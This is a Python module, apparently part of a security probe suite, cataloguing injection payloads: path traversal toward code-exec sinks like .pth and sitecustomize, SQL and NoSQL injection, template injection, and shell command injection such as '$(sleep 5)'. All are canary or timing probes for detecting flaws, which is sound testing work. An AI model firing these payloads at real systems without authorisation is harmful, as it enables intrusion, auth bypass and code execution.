"""The injection payload catalog — the data behind the generalized probe suite.

Each Payload is tagged with the attack class, the surface *types* it applies to,
and the oracle that detects success. The engine fires only the payloads whose
``applies_to`` includes the surface being probed, so adding a new surface type
(sql, http, kv, vsock, ...) automatically pulls in every payload written for it.
"""
from __future__ import annotations

from dataclasses import dataclass, field


class SurfaceType:
    OBJECT_STORE = "object-store"
    SQL = "sql"
    NOSQL = "nosql"
    KV = "kv"
    HTTP = "http"
    ENV = "env"
    VSOCK = "vsock"


# Oracle names — see oracles.py for the implementations.
class OracleName:
    ACCEPTED = "accepted"          # boundary took an adversarial input
    ERROR_SIGNATURE = "error-signature"  # known error string in the response
    BOOLEAN_DIFF = "boolean-diff"  # payload changes the result vs baseline
    TIME_DELAY = "time-delay"      # payload induces measurable latency
    REFLECTION = "reflection"      # payload output appears transformed
    OOB_CALLBACK = "oob-callback"  # payload triggers an out-of-band request


CANARY_TOKEN = "untrust-canary-probe"


@dataclass(frozen=True)
class Payload:
    attack_class: str
    applies_to: frozenset[str]
    vector: str                    # the injection string/structure (delivered by the surface)
    oracle: str
    description: str
    danger: str
    # For time-delay oracle: how long the payload should stall a vulnerable target.
    expected_delay_ms: int = 0
    # For reflection oracle: the marker a vulnerable target emits (e.g. "49").
    expected_marker: str = ""
    # Free-form tags (e.g. dialect hints).
    tags: frozenset[str] = field(default_factory=frozenset)


_OBJ = frozenset({SurfaceType.OBJECT_STORE})
_SQL = frozenset({SurfaceType.SQL})
_DOCKEY = frozenset({SurfaceType.NOSQL, SurfaceType.KV})
_HTTP = frozenset({SurfaceType.HTTP})


CATALOG: list[Payload] = [
    # ======================================================================
    # Object storage — path/name injection (S3/GCS bootstrap state).
    # Oracle: the write is accepted (the boundary holds an adversarial name).
    # ======================================================================
    Payload("path-traversal", _OBJ, f"../{CANARY_TOKEN}", OracleName.ACCEPTED,
            "single-level parent traversal", "write one dir above the state dir"),
    Payload("path-traversal", _OBJ, f"../../../../{CANARY_TOKEN}", OracleName.ACCEPTED,
            "multi-level traversal toward root", "plant into /etc, /root, site-packages"),
    Payload("path-traversal", _OBJ, f"sub/../../{CANARY_TOKEN}", OracleName.ACCEPTED,
            "traversal after a benign prefix", "escape even when keys look namespaced"),
    Payload("encoded-traversal", _OBJ, f"..%2f..%2f{CANARY_TOKEN}", OracleName.ACCEPTED,
            "URL-encoded slash traversal", "bypass literal '../' filters"),
    Payload("encoded-traversal", _OBJ, f"%2e%2e/%2e%2e/{CANARY_TOKEN}", OracleName.ACCEPTED,
            "percent-encoded dot-dot", "bypass literal '..' filters"),
    Payload("encoded-traversal", _OBJ, f"..%252f{CANARY_TOKEN}", OracleName.ACCEPTED,
            "double-encoded traversal", "bypass single-decode consumers"),
    Payload("encoded-traversal", _OBJ, f"....//{CANARY_TOKEN}", OracleName.ACCEPTED,
            "doubled dot/slash collapse", "bypass non-recursive '../'->'' strip"),
    Payload("absolute-path", _OBJ, f"/tmp/{CANARY_TOKEN}", OracleName.ACCEPTED,
            "absolute object name", "os.path.join base is discarded"),
    Payload("null-byte", _OBJ, f"{CANARY_TOKEN}%00.py", OracleName.ACCEPTED,
            "null-byte / extension smuggling", "truncate or retype the written path"),
    Payload("dangerous-sink", _OBJ, f"../{CANARY_TOKEN}.pth", OracleName.ACCEPTED,
            "Python .pth auto-exec sink", "code exec on next interpreter start"),
    Payload("dangerous-sink", _OBJ, f"../sitecustomize-{CANARY_TOKEN}.py", OracleName.ACCEPTED,
            "sitecustomize import-time hook", "code exec on interpreter init"),
    Payload("dangerous-sink", _OBJ, f"../../root/.{CANARY_TOKEN}rc", OracleName.ACCEPTED,
            "home-dir dotfile", "code exec on next shell / persistence"),

    # ======================================================================
    # SQL — the enclave reads config/state from a relational DB.
    # ======================================================================
    # Error-based: a syntax break should surface a DB error if concatenated.
    Payload("sqli", _SQL, "'", OracleName.ERROR_SIGNATURE,
            "unbalanced quote", "confirms string concatenation into the query"),
    Payload("sqli", _SQL, "1;--", OracleName.ERROR_SIGNATURE,
            "statement terminator + comment", "query structure is attacker-controlled"),
    Payload("sqli", _SQL, "' UNION SELECT NULL--", OracleName.ERROR_SIGNATURE,
            "union probe (column-count mismatch errors)", "data exfiltration via UNION"),
    # Boolean-based (blind): always-true condition changes the result set.
    Payload("sqli", _SQL, "' OR '1'='1", OracleName.BOOLEAN_DIFF,
            "always-true boolean", "blind extraction / auth bypass"),
    # Time-based (blind): a sleep stalls a vulnerable query.
    Payload("sqli", _SQL, "'; SELECT pg_sleep(5)--", OracleName.TIME_DELAY,
            "postgres time delay", "blind extraction when no output channel",
            expected_delay_ms=5000, tags=frozenset({"postgres"})),
    Payload("sqli", _SQL, "' OR SLEEP(5)--", OracleName.TIME_DELAY,
            "mysql time delay", "blind extraction when no output channel",
            expected_delay_ms=5000, tags=frozenset({"mysql"})),
    Payload("sqli", _SQL, "'; WAITFOR DELAY '0:0:5'--", OracleName.TIME_DELAY,
            "mssql time delay", "blind extraction when no output channel",
            expected_delay_ms=5000, tags=frozenset({"mssql"})),

    # ======================================================================
    # NoSQL / KV — operator injection into a document/key lookup.
    # ======================================================================
    Payload("nosqli", _DOCKEY, '{"$gt": ""}', OracleName.BOOLEAN_DIFF,
            "$gt operator injection", "auth bypass / return all documents"),
    Payload("nosqli", _DOCKEY, '{"$ne": null}', OracleName.BOOLEAN_DIFF,
            "$ne operator injection", "auth bypass / return all documents"),

    # ======================================================================
    # HTTP/API — a config service the enclave calls at boot.
    # ======================================================================
    Payload("ssti", _HTTP, "${{7*7}}", OracleName.REFLECTION,
            "server-side template injection", "RCE via template engine",
            expected_marker="49"),
    Payload("ssti", _HTTP, "#{7*7}", OracleName.REFLECTION,
            "SSTI (ruby/EL syntax)", "RCE via template engine",
            expected_marker="49"),
    Payload("cmdi", _HTTP, "; sleep 5", OracleName.TIME_DELAY,
            "OS command injection (chain)", "RCE on the config service",
            expected_delay_ms=5000),
    Payload("cmdi", _HTTP, "$(sleep 5)", OracleName.TIME_DELAY,
            "OS command injection (subshell)", "RCE on the config service",
            expected_delay_ms=5000),
]


def payloads_for(surface_type: str) -> list[Payload]:
    """Return the catalog payloads applicable to a given surface type."""
    return [p for p in CATALOG if surface_type in p.applies_to]
